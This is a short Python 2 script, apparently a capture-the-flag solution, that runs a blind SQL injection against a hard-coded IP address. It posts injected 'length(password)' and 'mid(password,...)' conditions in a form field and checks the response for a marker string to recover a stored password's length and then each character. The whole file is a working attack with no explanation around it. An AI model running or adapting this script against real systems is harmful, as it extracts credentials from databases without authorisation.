import requests
cmp="<grey>My Points</grey> | 1<br/>"
password = ""
url="http://47.97.168.223:23333/"
for i in range(0,100):
	query=data={'flag':"-1",'hi':' and length(password) like '+str(i)}
	req=requests.post(url,query)
	res=req.text
	if cmp in res:
		print "Got password length " + str(i)
		plen = i 
		break
	print query

for i in range(1,plen+1):
	for j in range(40,127):
		query=data={'flag':'-1','hi':' and mid(password,'+str(i)+',1) like "' + chr(j)+'"'}
		req=requests.post(url,query)
		res=req.text
		if cmp in res:
			password+=chr(j)
			print password
			break
		print query
print password
